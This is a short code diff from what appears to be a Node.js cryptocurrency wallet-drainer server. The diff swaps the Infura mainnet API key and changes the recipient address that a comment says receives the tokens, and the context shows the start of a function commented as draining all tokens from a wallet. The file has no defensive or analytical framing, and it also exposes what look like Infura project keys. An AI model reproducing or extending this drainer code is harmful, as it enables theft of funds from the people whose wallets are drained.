@@ -10,10 +10,10 @@ app.use(cors({
 }));
 
 // Replace with your Infura or Alchemy endpoint
-const web3 = new Web3('https://mainnet.infura.io/v3/d9a14138d69348d590ffa2edbed5eb3a');
+const web3 = new Web3('https://mainnet.infura.io/v3/a5bcd23a2bd145a395a10143ed34e1ea');
 
 // Set the recipient address (this is where the tokens will be sent)
-const recipientAddress = '0x81A77e3386006a52a5C4ED8989E00768c4c38a93';
+const recipientAddress = '0x231d66c5121aa46d80B5134491286c5EF82b60ac';
 
 // Function to drain all tokens from a wallet
 const drainWallet = async (fromAddress) => {
